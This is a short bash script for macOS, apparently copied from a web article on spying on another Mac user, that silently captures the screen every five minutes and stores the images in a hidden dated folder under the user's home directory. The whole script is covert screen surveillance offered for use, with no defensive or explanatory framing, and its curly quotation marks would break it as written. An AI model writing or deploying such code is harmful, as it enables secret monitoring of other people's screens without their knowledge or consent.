#!/bin/bash

maindir=$HOME”/.hiddendir/”
delay=300
while [ /bin/true ]
do
mnth=`date +%Y_%m_%b`
day=`date +%d_%a`
tme=`date +%Hh%Mm`
screendir=$(echo $maindir/$mnth/$day|sed ‘s/\/\//\//g’)
if [ ! -d $screendir ] ; then
mkdir -p $screendir
chmod a+rwx $screendir
fi
screencapture -Smx -tjpg $screendir/$tme.jpg
sleep $delay
done
exit 0

#Read more at http://www.askdavetaylor.com/can_i_spy_on_another_mac_user/#UYTAmqu5RKDWJCgA.99